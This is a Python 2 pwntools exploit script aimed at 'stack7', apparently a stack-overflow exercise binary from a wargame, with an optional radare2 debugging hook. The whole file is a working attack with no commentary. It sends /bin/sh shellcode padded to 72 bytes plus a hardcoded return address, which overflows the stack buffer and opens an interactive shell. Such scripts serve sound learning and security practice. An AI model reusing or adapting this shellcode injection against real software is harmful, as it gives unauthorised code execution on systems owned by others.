#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import os
import sys

_DEBUG = False

io = process('../bin/stack7')

pack = make_packer()
unpack = make_unpacker()

def radare2():
    c = "aaaa; db main; "
    c += "db 0x08048502; "
    c += "db 0x08048552; "
    c += "db; "

    pid = util.proc.pidof(io)[0]
    os.system('screen r2 -d %d -c "%s"' % (pid, c))
    util.proc.wait_for_debugger(pid)

def exploit():
    shell = asm(shellcraft.sh())
    io.sendline(shell + 'A' * (72 - len(shell)) + pack(0xffffcdbc))
    io.interactive()

if __name__ == "__main__":
    if _DEBUG:
        radare2()
    exploit()
